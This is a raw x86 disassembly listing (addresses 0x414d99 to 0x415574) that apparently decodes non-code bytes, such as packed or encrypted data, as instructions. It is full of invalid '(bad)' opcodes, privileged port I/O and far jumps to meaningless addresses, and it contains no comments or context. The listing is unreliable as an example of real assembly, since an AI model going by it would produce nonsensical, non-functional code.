  414d99:	xchg   ebx,eax
  414d9a:	mov    BYTE PTR [ebp-0x6f],al
  414d9d:	iret   
  414d9e:	jns    0x414df4
  414da0:	(bad)  
  414da1:	ja     0x414e18
  414da3:	dec    ebx
  414da4:	lods   eax,DWORD PTR ds:[esi]
  414da5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414da6:	popf   
  414da7:	lods   al,BYTE PTR ds:[esi]
  414da8:	ins    BYTE PTR es:[edi],dx
  414da9:	push   es
  414daa:	adc    ch,BYTE PTR [esi-0x39d591bb]
  414db0:	and    esi,ebp
  414db2:	lea    edx,[ecx-0x2ee1353b]
  414db8:	push   ecx
  414db9:	cmp    DWORD PTR [eax-0xdc8e342],ebp
  414dbf:	sbb    BYTE PTR [esi],bl
  414dc1:	cmp    bl,cl
  414dc3:	and    BYTE PTR [ecx],0xfd
  414dc6:	outs   dx,DWORD PTR ds:[esi]
  414dc7:	xlat   BYTE PTR ds:[ebx]
  414dc8:	fs (bad) 
  414dca:	setne  cl
  414dcd:	(bad)  
  414dce:	jl     0x414d7f
  414dd0:	imul   ebx,DWORD PTR [esi+ecx*4-0x75e642e8],0xffffffe2
  414dd8:	push   0x11
  414dda:	sbb    BYTE PTR [ecx],ah
  414ddc:	mov    esp,0xbcfd859c
  414de1:	repz test eax,0xdf1afb57
  414de7:	sbb    BYTE PTR [ebx],bh
  414de9:	pushf  
  414dea:	and    bl,BYTE PTR [esi]
  414dec:	mov    al,ds:0x38349e7f
  414df1:	sbb    BYTE PTR [ecx],0xe0
  414df4:	push   es
  414df5:	outs   dx,DWORD PTR ds:[esi]
  414df6:	sbb    BYTE PTR [ebx-0x2],0xbd
  414dfa:	cld    
  414dfb:	outs   dx,BYTE PTR ds:[esi]
  414dfc:	ret    
  414dfd:	cmp    dh,BYTE PTR [esi-0x60a320ac]
  414e03:	lods   eax,DWORD PTR ds:[esi]
  414e04:	daa    
  414e05:	add    edi,DWORD PTR [eax-0x3]
  414e08:	xor    al,BYTE PTR [edi]
  414e0a:	(bad)  
  414e0b:	and    al,0x8b
  414e0d:	xchg   ebx,eax
  414e0e:	loop   0x414dd4
  414e10:	dec    esp
  414e11:	lods   al,BYTE PTR ds:[esi]
  414e12:	(bad)  [esi+0x603b546d]
  414e18:	aam    0x23
  414e1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e1b:	iret   
  414e1c:	hlt    
  414e1d:	out    0xf3,eax
  414e1f:	dec    esi
  414e20:	inc    esp
  414e21:	ja     0x414e8e
  414e23:	mov    edi,0x4afceed8
  414e28:	fild   QWORD PTR [ebp-0x1bdc1def]
  414e2e:	or     eax,0xe4438b28
  414e33:	sbb    BYTE PTR [edi+0x11],bh
  414e36:	xchg   ebx,eax
  414e37:	in     al,0xd8
  414e39:	out    dx,al
  414e3a:	pop    ecx
  414e3b:	xor    bl,dl
  414e3d:	jmp    0x414def
  414e3f:	rcr    DWORD PTR [ecx+0x1e0a2631],0xd5
  414e46:	and    ecx,DWORD PTR [eax]
  414e48:	or     al,0xce
  414e4a:	scas   al,BYTE PTR es:[edi]
  414e4b:	sub    BYTE PTR [esi-0x85f3e37],0x81
  414e52:	jle    0x414e6b
  414e54:	in     al,dx
  414e55:	dec    esp
  414e56:	cs push ebp
  414e58:	mov    al,dh
  414e5a:	jg     0x414df5
  414e5c:	xor    BYTE PTR [ecx],0x34
  414e5f:	imul   edi,ebp,0x13
  414e62:	shl    BYTE PTR [ebp-0x74],cl
  414e65:	push   ebp
  414e66:	jnp    0x414e85
  414e68:	neg    BYTE PTR [esi-0x66103454]
  414e6e:	das    
  414e6f:	ficom  DWORD PTR [eax+0x34]
  414e72:	mov    bl,BYTE PTR [edx-0x54]
  414e75:	in     eax,dx
  414e76:	pushf  
  414e77:	or     BYTE PTR [ecx+0x29],cl
  414e7a:	dec    ebp
  414e7b:	shr    BYTE PTR [ecx+0x17],cl
  414e7e:	jbe    0x414e4d
  414e80:	call   0x2e17:0x38a01f90
  414e87:	pop    eax
  414e88:	or     eax,DWORD PTR [esi+0xf]
  414e8b:	add    eax,0x65f19d6b
  414e90:	addr16 loopne 0x414eef
  414e93:	in     eax,dx
  414e94:	xchg   edx,eax
  414e95:	dec    ebx
  414e96:	pop    es
  414e97:	sbb    DWORD PTR [ebp+0x1c],ecx
  414e9a:	pop    ebp
  414e9b:	push   ss
  414e9c:	sbb    BYTE PTR [ebp+0x30],cl
  414e9f:	inc    eax
  414ea0:	jbe    0x414eca
  414ea2:	push   ebp
  414ea3:	mov    edi,0x64dd4003
  414ea8:	retf   0x78ee
  414eab:	in     eax,dx
  414eac:	enter  0x3db1,0x2e
  414eb0:	stc    
  414eb1:	mov    esi,DWORD PTR [ebp+0x3a]
  414eb4:	inc    ebx
  414eb5:	sti    
  414eb6:	sbb    al,0x3a
  414eb8:	and    al,0xaa
  414eba:	gs xor eax,0x90fe41a5
  414ec0:	push   0xb596f587
  414ec5:	repnz in eax,0x3
  414ec8:	add    esi,0x4f
  414ecb:	imul   edx,DWORD PTR [ebp-0x10],0xc5cdc548
  414ed2:	mov    eax,0xbc5cb117
  414ed7:	mov    ch,0x63
  414ed9:	popf   
  414eda:	call   0xd10566e
  414edf:	hlt    
  414ee0:	and    eax,DWORD PTR [edx+0x64e7ec65]
  414ee6:	out    0xbe,eax
  414ee8:	xchg   esi,eax
  414ee9:	jnp    0x414f48
  414eeb:	or     ah,BYTE PTR [ecx+0x6665960c]
  414ef1:	add    ch,BYTE PTR [edx]
  414ef3:	in     al,0x7a
  414ef5:	sbb    al,0xa3
  414ef7:	fdivr  st,st(6)
  414ef9:	les    esi,FWORD PTR [esp+eiz*4-0x774b07d5]
  414f00:	or     DWORD PTR [ecx+0x654084c2],eax
  414f06:	pop    esp
  414f07:	lahf   
  414f08:	jp     0x414f4f
  414f0a:	fadd   st,st(2)
  414f0c:	pusha  
  414f0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f0e:	push   cs
  414f0f:	push   ebx
  414f10:	arpl   WORD PTR [esi+0x3bc0c59],bx
  414f16:	inc    esi
  414f17:	jnp    0x414f25
  414f19:	sub    ecx,ecx
  414f1b:	jo     0x414ee2
  414f1d:	nop
  414f1e:	aaa    
  414f1f:	mov    edx,DWORD PTR [esi+ebp*1-0x60]
  414f23:	loope  0x414f2c
  414f25:	leave  
  414f26:	(bad)  
  414f27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f28:	shl    DWORD PTR [eax+0xc],1
  414f2b:	lods   eax,DWORD PTR ds:[esi]
  414f2c:	fild   DWORD PTR [esi]
  414f2e:	xchg   ebx,eax
  414f2f:	mov    dh,0x67
  414f31:	lds    esp,FWORD PTR [ebx-0x638710d7]
  414f37:	sub    eax,0xebbeb140
  414f3c:	hlt    
  414f3d:	fadd   DWORD PTR [ebx+0x4325de61]
  414f43:	jmp    0x414edc
  414f45:	adc    DWORD PTR [edi+0x26da278f],esp
  414f4b:	gs mov dl,0xf9
  414f4e:	clc    
  414f4f:	(bad)  
  414f50:	into   
  414f51:	mov    ch,0xad
  414f53:	and    BYTE PTR [ebx],dl
  414f55:	dec    edx
  414f56:	scas   al,BYTE PTR es:[edi]
  414f57:	sar    esp,0x1b
  414f5a:	cmp    ah,BYTE PTR [esi-0x35d74690]
  414f60:	add    eax,0x9e0a7aee
  414f65:	pop    ebp
  414f66:	or     ecx,DWORD PTR [ecx]
  414f68:	or     esp,0xe4c06a77
  414f6e:	sub    ah,dh
  414f70:	ds pop ebx
  414f72:	xor    bh,dh
  414f74:	xchg   edx,eax
  414f75:	xchg   esp,eax
  414f76:	sbb    BYTE PTR [ebp-0x2cacc71b],bl
  414f7c:	fnclex 
  414f7e:	mov    ds:0x2722577b,eax
  414f83:	inc    edx
  414f84:	jmp    0xaa5c1138
  414f89:	(bad)  
  414f8a:	cdq    
  414f8b:	pop    ebx
  414f8c:	add    DWORD PTR [eax-0x33],edi
  414f8f:	sti    
  414f90:	popa   
  414f91:	leave  
  414f92:	jno    0x414f24
  414f94:	jp     0x414f7b
  414f96:	js     0x414fc6
  414f98:	and    esi,esi
  414f9a:	jmp    0xd8878ad0
  414f9f:	and    eax,0x4b1b99a3
  414fa4:	or     eax,0x82a23b6c
  414fa9:	xor    DWORD PTR [ebx-0x2b3f8e48],edi
  414faf:	pusha  
  414fb0:	cld    
  414fb1:	add    ebp,0xb9634f7e
  414fb7:	or     eax,0xff77b208
  414fbc:	jb     0x414f69
  414fbe:	jecxz  0x414f45
  414fc0:	loope  0x41502e
  414fc2:	xchg   edi,eax
  414fc3:	xchg   esi,eax
  414fc4:	mov    esp,0xb2517672
  414fc9:	call   0xe0bc:0x349f138
  414fd0:	fs xchg esi,eax
  414fd2:	ins    BYTE PTR es:[edi],dx
  414fd3:	stos   BYTE PTR es:[edi],al
  414fd4:	push   esi
  414fd5:	mov    ds:0x52cf1573,eax
  414fda:	test   BYTE PTR [esi+0x4d],ah
  414fdd:	inc    eax
  414fde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fdf:	jmp    0x9eff01f0
  414fe4:	test   BYTE PTR [ebp+0x57],ch
  414fe7:	icebp  
  414fe8:	add    DWORD PTR [edx],edi
  414fea:	adc    BYTE PTR [edx+0x76],bl
  414fed:	xor    BYTE PTR [ecx+0x66e06e44],dl
  414ff3:	dec    edi
  414ff4:	cmp    DWORD PTR [edx],ecx
  414ff6:	fadd   st(5),st
  414ff8:	sbb    al,0xae
  414ffa:	(bad)  ds:0x48245bec
  415000:	sbb    al,0xbc
  415002:	mov    edi,0x7caadba7
  415007:	push   edi
  415008:	outs   dx,BYTE PTR ds:[esi]
  415009:	pop    ebp
  41500a:	cwde   
  41500b:	pop    ebp
  41500c:	mov    dl,0x77
  41500e:	into   
  41500f:	ss aam 0xae
  415012:	fnsetpm(287 only) 
  415014:	sbb    BYTE PTR [ebx+0x34],bl
  415017:	addr16 ror edi,cl
  41501a:	in     al,dx
  41501b:	mov    ecx,0xc347b531
  415020:	xchg   BYTE PTR [ebx-0x56afbafa],bh
  415026:	pop    edi
  415027:	scas   eax,DWORD PTR es:[edi]
  415028:	push   edx
  415029:	jae    0x414ff8
  41502b:	pop    ecx
  41502c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41502d:	xbegin 0x37cfa66d
  415033:	xor    al,0x95
  415035:	out    0xe5,al
  415037:	jl     0x415092
  415039:	cmp    DWORD PTR [ecx-0x16f54772],ebx
  41503f:	sbb    edi,esi
  415041:	sbb    al,0x65
  415043:	fidiv  WORD PTR [edx+0x763fddc0]
  415049:	div    DWORD PTR [eax]
  41504b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41504c:	loope  0x41500a
  41504e:	stc    
  41504f:	or     esi,DWORD PTR [esi]
  415051:	push   ecx
  415052:	mov    bl,0x94
  415054:	(bad)  
  415055:	pop    edi
  415056:	sbb    eax,0x51c79cd2
  41505b:	dec    edi
  41505c:	jg     0x41504d
  41505e:	cmp    al,0xeb
  415060:	fidiv  WORD PTR [ecx+0x39c0822a]
  415066:	push   edx
  415067:	aam    0x3f
  415069:	and    eax,0x7d4eb603
  41506e:	les    ebp,FWORD PTR [esi]
  415070:	push   ebx
  415071:	pop    DWORD PTR [edi]
  415073:	nop
  415074:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415075:	cld    
  415076:	imul   esp,edi,0xa99236f3
  41507c:	out    0x36,eax
  41507e:	ins    BYTE PTR es:[edi],dx
  41507f:	rol    DWORD PTR [ebx],1
  415081:	retf   
  415082:	add    DWORD PTR [ebx+eax*8-0x25e173cd],ecx
  415089:	sub    DWORD PTR [esp-0x60],eax
  41508d:	xchg   ebp,eax
  41508e:	ror    DWORD PTR [edx+0x5c],0x53
  415092:	xchg   edx,eax
  415093:	xor    eax,0xea002384
  415098:	shr    BYTE PTR [edx+esi*4],cl
  41509b:	imul   ebx,DWORD PTR [si+0x42],0x7e
  4150a0:	and    esi,DWORD PTR [ecx]
  4150a2:	jbe    0x415025
  4150a4:	shl    BYTE PTR [ebx-0x73cdfb39],0x1b
  4150ab:	ins    BYTE PTR es:[edi],dx
  4150ac:	mov    ah,0xb5
  4150ae:	dec    esp
  4150af:	jnp    0x41507e
  4150b1:	jle    0x4150f6
  4150b3:	mov    ebx,0x221277f
  4150b8:	mov    edi,0xa61ab299
  4150bd:	jae    0x41508b
  4150bf:	inc    ebx
  4150c0:	jle    0x415114
  4150c2:	cld    
  4150c3:	or     eax,0x9f73c2b7
  4150c8:	fdivp  st(7),st
  4150ca:	lods   eax,DWORD PTR ds:[esi]
  4150cb:	fmulp  st(2),st
  4150cd:	je     0x4150d7
  4150cf:	test   DWORD PTR [ecx+ebp*8+0x75],eax
  4150d3:	iret   
  4150d4:	imul   ecx,DWORD PTR [ebx-0x4986c3ca],0x179d26f0
  4150de:	sub    DWORD PTR [ebp-0x5c],0xffffffdc
  4150e2:	inc    esp
  4150e3:	call   FWORD PTR [ebp+0x74]
  4150e6:	nop
  4150e7:	xor    eax,0xf6523879
  4150ec:	data16 loop 0x4150bf
  4150ef:	mov    ah,0xf8
  4150f1:	test   eax,0x3ce6b5f3
  4150f6:	test   BYTE PTR [edi],bl
  4150f8:	(bad)  
  4150f9:	int3   
  4150fa:	ja     0x415157
  4150fc:	cmp    DWORD PTR [edi+0x5e],0x93f5990
  415103:	xchg   edi,eax
  415104:	push   ds
  415105:	imul   ebp,DWORD PTR [esi],0x4e
  415108:	out    0x2a,eax
  41510a:	inc    ebx
  41510b:	arpl   WORD PTR [ecx+0x54561038],bx
  415111:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415112:	sbb    DWORD PTR [ecx],eax
  415114:	test   eax,0x3aea5cc3
  415119:	xchg   ebx,eax
  41511a:	ror    BYTE PTR [edx+0x1bd01b0c],0x49
  415121:	mov    al,ds:0xe721170c
  415126:	sub    ebp,edi
  415128:	test   ebx,ebx
  41512a:	jmp    0x415104
  41512c:	mov    eax,ds:0x196985f2
  415131:	out    dx,al
  415132:	dec    DWORD PTR [edx]
  415134:	sbb    BYTE PTR [ebx-0x4d13911f],dh
  41513a:	call   0x6e76d3a4
  41513f:	add    al,0xb1
  415141:	cmp    DWORD PTR [esi],0x4a
  415144:	mov    ebp,0xaf4420e5
  415149:	dec    eax
  41514a:	es cs cmp eax,0xbaa94f0b
  415151:	ja     0x4151c3
  415153:	dec    esp
  415154:	retf   0x803
  415157:	fistp  WORD PTR [eax+edx*8-0x14]
  41515b:	xchg   ebp,eax
  41515c:	cmp    eax,DWORD PTR [eax+0x5f30f0be]
  415162:	or     BYTE PTR [esi-0x60],dl
  415165:	sub    eax,DWORD PTR ds:[ecx-0x4a2ddf6b]
  41516c:	clc    
  41516d:	ja     0x4151e2
  41516f:	pop    ebp
  415170:	fcmove st,st(7)
  415172:	inc    edx
  415173:	cmc    
  415174:	fbld   TBYTE PTR [ecx]
  415176:	xchg   bh,cl
  415178:	fsincos 
  41517a:	adc    ebp,DWORD PTR [ebx]
  41517c:	das    
  41517d:	push   esp
  41517e:	cld    
  41517f:	sbb    DWORD PTR [esi+0x4c],edx
  415182:	and    DWORD PTR [esi+0x53],edi
  415185:	and    al,0x49
  415187:	stos   BYTE PTR es:[edi],al
  415188:	stos   BYTE PTR es:[edi],al
  415189:	and    ch,dl
  41518b:	xchg   ebp,eax
  41518c:	test   al,0x85
  41518e:	cmc    
  41518f:	jns    0x41511a
  415191:	imul   edi,DWORD PTR [ebx+ebp*8],0x7801fa3d
  415198:	lock into 
  41519a:	scas   al,BYTE PTR es:[edi]
  41519b:	mov    ch,ch
  41519d:	adc    BYTE PTR [edx],ah
  41519f:	clc    
  4151a0:	or     al,0xc2
  4151a2:	ins    DWORD PTR es:[edi],dx
  4151a3:	mov    ds:0x4b01cfb5,eax
  4151a8:	out    dx,al
  4151a9:	push   esp
  4151aa:	xor    al,0x45
  4151ac:	repz jle 0x415145
  4151af:	xor    BYTE PTR [ebx+0x1],al
  4151b2:	les    ebp,FWORD PTR [esi]
  4151b4:	add    DWORD PTR [edx],0x484e3d00
  4151ba:	gs aaa 
  4151bc:	imul   esp,DWORD PTR [eax-0x6d3540f9],0xb4ba214f
  4151c6:	mov    dl,0x5a
  4151c8:	scas   al,BYTE PTR es:[edi]
  4151c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151ca:	leave  
  4151cb:	and    DWORD PTR [ebx],ebp
  4151cd:	call   0xe24d24e7
  4151d2:	inc    ecx
  4151d3:	dec    ebp
  4151d4:	(bad)  
  4151d5:	fimul  WORD PTR [eax+0x3907bf37]
  4151db:	push   edi
  4151dc:	inc    ecx
  4151dd:	adc    al,BYTE PTR [edx-0x520b80cd]
  4151e3:	or     edi,ebx
  4151e5:	(bad)  [ebx-0x4c86d107]
  4151eb:	jnp    0x415252
  4151ed:	adc    eax,0x9ef8975f
  4151f2:	fdivr  st(6),st
  4151f4:	xor    BYTE PTR [edi-0x358a23df],ah
  4151fa:	mov    ecx,0x793b6910
  4151ff:	retf   0x63a2
  415202:	cmp    DWORD PTR [ebp+0x44],edx
  415205:	aad    0xd2
  415207:	in     eax,0x4f
  415209:	mov    esi,DWORD PTR [ebx-0x1069c150]
  41520f:	sahf   
  415210:	mov    ch,0x0
  415212:	and    al,dl
  415214:	cmp    al,0x10
  415216:	sub    al,0xae
  415218:	shr    BYTE PTR [esi+0xa328f05],cl
  41521e:	adc    al,ah
  415220:	fld    TBYTE PTR [edi+0x2c3ad3e7]
  415226:	mov    ah,0xd4
  415228:	or     al,0x27
  41522a:	jmp    0x9cd5:0xaceb11f6
  415231:	pop    edi
  415233:	jmp    0xc8aa8338
  415238:	je     0x415283
  41523a:	shr    BYTE PTR [ecx],0xd8
  41523d:	push   ecx
  41523e:	add    dh,BYTE PTR [esi+0x61cca999]
  415244:	stc    
  415245:	xlat   BYTE PTR ds:[ebx]
  415246:	and    DWORD PTR ds:0x7691a2d3,esp
  41524c:	mov    ebp,0x47c1d48d
  415251:	or     DWORD PTR [edx],0x773150d
  415257:	fs push esi
  415259:	xchg   esp,eax
  41525a:	loop   0x41522a
  41525c:	mov    dh,0x7d
  41525e:	or     BYTE PTR [eax-0x1a1e6a4d],0x29
  415265:	in     al,0xa5
  415267:	xchg   edx,eax
  415268:	adc    cl,bh
  41526a:	adc    edx,esi
  41526c:	scas   al,BYTE PTR es:[edi]
  41526d:	jo     0x415255
  41526f:	sahf   
  415270:	sub    DWORD PTR [ebp-0x41f37cd0],0xffffffe0
  415277:	in     eax,0xac
  415279:	in     al,dx
  41527a:	xchg   BYTE PTR [esi-0x1e45392e],al
  415280:	mov    ebp,0xf52e02b
  415285:	mov    al,ds:0xd273772b
  41528a:	xor    edi,DWORD PTR [ebx+ebx*1+0x7]
  41528e:	inc    edx
  41528f:	or     DWORD PTR ss:[esi-0x34],0x4053feba
  415297:	xor    edi,DWORD PTR [ecx+0x7875d004]
  41529d:	xor    DWORD PTR [eax-0x73],ecx
  4152a0:	shl    BYTE PTR fs:[edi],cl
  4152a3:	mov    dh,0x86
  4152a5:	mov    bh,0xb0
  4152a7:	and    BYTE PTR [edx+ebp*2-0x66],al
  4152ab:	mov    bl,0x1d
  4152ad:	ret    0x4d6a
  4152b0:	jns    0x415288
  4152b2:	and    al,0x8d
  4152b4:	xor    eax,0x244adb10
  4152b9:	jbe    0x415268
  4152bb:	leave  
  4152bc:	pop    esi
  4152bd:	test   BYTE PTR [ebx-0x60c1ac6a],0xbf
  4152c4:	es or  bl,bh
  4152c7:	xor    cl,BYTE PTR [ebx+0x4a]
  4152ca:	mov    WORD PTR [edx-0x76c2ff89],cs
  4152d0:	ret    0x9124
  4152d3:	dec    esi
  4152d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152d5:	mov    eax,0x6191fb52
  4152da:	cs (bad) 
  4152dd:	push   esi
  4152de:	cmc    
  4152df:	add    dh,BYTE PTR ds:0x60d629f8
  4152e5:	ror    DWORD PTR [ebx],cl
  4152e7:	xchg   esp,eax
  4152e8:	push   ebx
  4152e9:	std    
  4152ea:	push   esi
  4152eb:	fldcw  WORD PTR [ebx-0x593fef1b]
  4152f1:	ins    DWORD PTR es:[edi],dx
  4152f2:	sub    ebx,ebp
  4152f4:	sub    BYTE PTR [eax],al
  4152f6:	jns    0x4152f1
  4152f8:	push   ds
  4152f9:	jge    0x415364
  4152fb:	jno    0x41532e
  4152fd:	ret    0x8cf5
  415300:	les    esp,FWORD PTR [ebx+edi*4+0x1fedfa6e]
  415307:	bnd jg 0x4152be
  41530a:	jge    0x4152f7
  41530c:	xchg   BYTE PTR [esi],ah
  41530e:	jne    0x4152cd
  415310:	xchg   edx,eax
  415311:	push   0xffffffd2
  415313:	das    
  415314:	mov    esp,cs
  415316:	das    
  415317:	les    ecx,FWORD PTR [ebp+0x0]
  41531a:	cdq    
  41531b:	mov    edx,0xebf66fb0
  415320:	dec    esp
  415321:	stos   BYTE PTR es:[edi],al
  415322:	xchg   ebp,eax
  415323:	xchg   ah,dl
  415325:	cld    
  415326:	inc    ecx
  415327:	push   edi
  415328:	jnp    0x41535c
  41532a:	dec    ecx
  41532b:	and    DWORD PTR [edi],ecx
  41532d:	ss jle 0x4152db
  415330:	mov    edi,0x3c305b7c
  415335:	leave  
  415336:	cmp    al,cl
  415338:	xor    ecx,DWORD PTR [esi]
  41533a:	cwde   
  41533b:	and    esp,DWORD PTR [edi+0x58f6f514]
  415341:	xor    BYTE PTR [ecx],0x56
  415344:	dec    esi
  415345:	pcmpgtw mm3,QWORD PTR [edi+0x24804a80]
  41534c:	inc    edx
  41534d:	popa   
  41534e:	inc    edi
  41534f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415350:	and    BYTE PTR [edx],cl
  415352:	(bad)  
  415353:	or     al,0xe5
  415355:	mov    ebx,0xa5bf6dfb
  41535a:	or     esi,edi
  41535c:	js     0x4152f4
  41535e:	xchg   bl,al
  415360:	add    al,0xbc
  415362:	and    cl,BYTE PTR [ebp-0x4471473e]
  415368:	dec    ecx
  415369:	imul   edx,DWORD PTR [edi],0xa7af34e
  41536f:	inc    esi
  415370:	mov    edx,0x226fd092
  415375:	jg     0x415353
  415377:	xor    bl,ch
  415379:	out    dx,al
  41537a:	fsubrp st(1),st
  41537c:	pop    ebp
  41537d:	rcl    DWORD PTR [edx+0x7bed0de2],0xa1
  415384:	in     al,dx
  415385:	inc    eax
  415386:	xlat   BYTE PTR ds:[ebx]
  415387:	jnp    0x4153df
  415389:	mov    bh,0xd5
  41538b:	push   eax
  41538c:	sahf   
  41538d:	jp     0x415363
  41538f:	xchg   esp,eax
  415390:	pop    esp
  415391:	test   al,0xc7
  415393:	jbe    0x415356
  415395:	out    dx,eax
  415396:	pop    ebx
  415397:	aam    0x16
  415399:	mov    edi,0x46f964b4
  41539e:	leave  
  41539f:	push   es
  4153a0:	inc    eax
  4153a1:	pop    edi
  4153a2:	(bad)  
  4153a3:	cmp    ebx,esi
  4153a5:	data16 lods al,BYTE PTR ds:[esi]
  4153a7:	fnstsw WORD PTR [ebp+0x2d]
  4153aa:	pop    ds
  4153ab:	inc    ebp
  4153ac:	xchg   ebx,eax
  4153ad:	mov    bh,0x7c
  4153af:	div    DWORD PTR [ebx+0x28393e23]
  4153b5:	mov    ax,0x3ed4
  4153b9:	xor    al,0xf8
  4153bb:	adc    al,0x7d
  4153bd:	sub    al,0xd7
  4153bf:	pop    ds
  4153c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153c1:	pop    ebp
  4153c2:	call   0x8a1e:0x9919b21
  4153c9:	xchg   ecx,eax
  4153ca:	xor    bh,BYTE PTR [ecx]
  4153cc:	pop    ebp
  4153cd:	pop    ecx
  4153ce:	cmp    BYTE PTR [esi+0x63f23180],al
  4153d4:	xor    eax,0xd248acfe
  4153d9:	pop    ds
  4153da:	stos   DWORD PTR es:[edi],eax
  4153db:	retf   0xe421
  4153de:	jns    0x41536d
  4153e0:	aas    
  4153e1:	pusha  
  4153e2:	sub    BYTE PTR [edx+0x59b0effb],0x86
  4153e9:	add    ebx,DWORD PTR [eax+ecx*2]
  4153ec:	js     0x4153cd
  4153ee:	mov    ds:0x9a37c764,al
  4153f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153f4:	jmp    DWORD PTR [ecx-0x5dbfa2f1]
  4153fa:	jmp    0xdfec2ead
  4153ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415400:	lods   eax,DWORD PTR ds:[esi]
  415401:	add    eax,0x70cd57b7
  415406:	add    DWORD PTR [edx-0x78],ebx
  415409:	mov    eax,ds:0x3db8a884
  41540e:	mul    BYTE PTR [esp+edx*8+0x6a]
  415412:	or     ecx,DWORD PTR ds:0xd7255682
  415418:	jge    0x4153c0
  41541a:	adc    eax,0x5cbf90f5
  41541f:	sbb    esp,edi
  415421:	dec    dh
  415423:	jb     0x415448
  415425:	dec    eax
  415426:	(bad)  
  415427:	mov    al,ds:0x5d4dcaa4
  41542c:	pop    ds
  41542d:	cli    
  41542e:	imul   ch
  415430:	and    eax,0x9420d7ff
  415435:	dec    edi
  415436:	in     eax,0xc6
  415438:	stos   DWORD PTR es:[edi],eax
  415439:	or     BYTE PTR [ebx+0x16],dl
  41543c:	popf   
  41543d:	push   0x63d6f916
  415442:	les    esp,FWORD PTR [edi]
  415444:	fwait
  415445:	in     eax,0xb1
  415447:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415448:	ret    
  415449:	ss jb  0x4153fa
  41544c:	mov    edi,0x5cdda7b7
  415451:	repnz push edi
  415453:	mov    dl,BYTE PTR [esi+edi*2]
  415456:	mov    bh,al
  415458:	mov    edi,0x582f3902
  41545d:	dec    ebx
  41545e:	fucomp st(0)
  415460:	mov    ds:0x180cde1c,al
  415465:	jle    0x4154cd
  415467:	loop   0x415408
  415469:	scas   eax,DWORD PTR es:[edi]
  41546a:	and    ah,BYTE PTR [edi*4+0x3f845aa]
  415471:	in     al,0x5a
  415473:	inc    eax
  415474:	je     0x4154b5
  415476:	shl    DWORD PTR [edi],cl
  415478:	les    ebp,FWORD PTR [edi]
  41547a:	jl     0x41547d
  41547c:	dec    ecx
  41547d:	pop    edx
  41547e:	mov    ds:0x1193d95c,eax
  415483:	rcr    DWORD PTR [edi-0x44],0xaf
  415487:	mov    DWORD PTR [ebx-0x73],ecx
  41548a:	ja     0x415456
  41548c:	sti    
  41548d:	cmp    ah,BYTE PTR [ebx+0x10a40bad]
  415493:	mov    esp,0x582e5d7d
  415498:	daa    
  415499:	ins    DWORD PTR es:[edi],dx
  41549a:	mov    ds:0xdd274060,eax
  41549f:	aam    0xb6
  4154a1:	shl    DWORD PTR [ecx-0x41],1
  4154a4:	mov    eax,ds:0xfdfa29a6
  4154a9:	jno    0x4154ae
  4154ab:	jp     0x415513
  4154ad:	inc    esi
  4154ae:	not    DWORD PTR [ecx+0x7b9fbf4e]
  4154b4:	jno    0x4154bb
  4154b6:	dec    ebx
  4154b7:	lahf   
  4154b8:	cmp    DWORD PTR [edx+esi*4-0x34],eax
  4154bc:	or     DWORD PTR [eax],ebp
  4154be:	cmc    
  4154bf:	and    al,0xd9
  4154c1:	leave  
  4154c2:	div    DWORD PTR ds:0x43fd887d
  4154c8:	mov    ebx,0x68cb5a8e
  4154cd:	xchg   BYTE PTR [ebx],bl
  4154cf:	call   0x89a5:0x251a96df
  4154d6:	fwait
  4154d7:	rcl    ah,0x3d
  4154da:	adc    bh,ch
  4154dc:	fstp   st(6)
  4154de:	jmp    0x415508
  4154e0:	jbe    0x4154b7
  4154e2:	push   ebx
  4154e3:	out    dx,al
  4154e4:	call   0x27b1:0xccdde0fc
  4154eb:	cmp    esp,DWORD PTR fs:[esi+ebx*2+0x5c8e5125]
  4154f3:	adc    eax,0x3e71f78c
  4154f8:	inc    esi
  4154f9:	lahf   
  4154fa:	out    dx,al
  4154fb:	add    edx,esi
  4154fd:	int    0x7a
  4154ff:	inc    ebx
  415500:	sbb    esi,ebp
  415502:	test   dl,0x2d
  415505:	rcr    DWORD PTR [eax],cl
  415507:	aas    
  415508:	cmp    DWORD PTR ds:[ecx+0xd789d62],edx
  41550f:	and    esp,esi
  415511:	popf   
  415512:	repz stc 
  415514:	nop
  415515:	pop    esi
  415516:	jmp    0xb867e417
  41551b:	push   ss
  41551c:	dec    esi
  41551d:	cli    
  41551e:	imul   esp,DWORD PTR [ebx-0xec4759d],0x4459f8c9
  415528:	cdq    
  415529:	dec    esi
  41552a:	dec    ebx
  41552b:	out    dx,al
  41552c:	mov    bl,al
  41552e:	addr16 mov esi,0x546aeda2
  415534:	test   al,0xba
  415536:	fnstenv [ebp-0x78]
  415539:	(bad)  
  41553a:	cmc    
  41553b:	out    dx,al
  41553c:	push   es
  41553d:	mov    esp,0x45e215b7
  415542:	(bad)  
  415543:	in     al,0x75
  415545:	in     eax,0x80
  415547:	std    
  415548:	dec    edx
  415549:	push   esp
  41554a:	push   esp
  41554b:	cli    
  41554c:	or     eax,DWORD PTR [edx]
  41554e:	adc    esp,0xc6a860e7
  415554:	and    eax,ebp
  415556:	mov    ah,0x42
  415558:	xchg   ebp,eax
  415559:	mov    ecx,0xaf66789a
  41555e:	(bad)  
  41555f:	ins    BYTE PTR es:[edi],dx
  415560:	add    BYTE PTR [ebp-0x22],bh
  415563:	or     eax,0x5707221a
  415568:	pop    esp
  415569:	rcr    ebx,cl
  41556b:	fdivp  st(1),st
  41556d:	inc    esi
  41556e:	add    al,0x69
  415570:	fs ds clc 
  415573:	inc    edx
  415574:	adc    BYTE PTR [ebx+0x44],cl
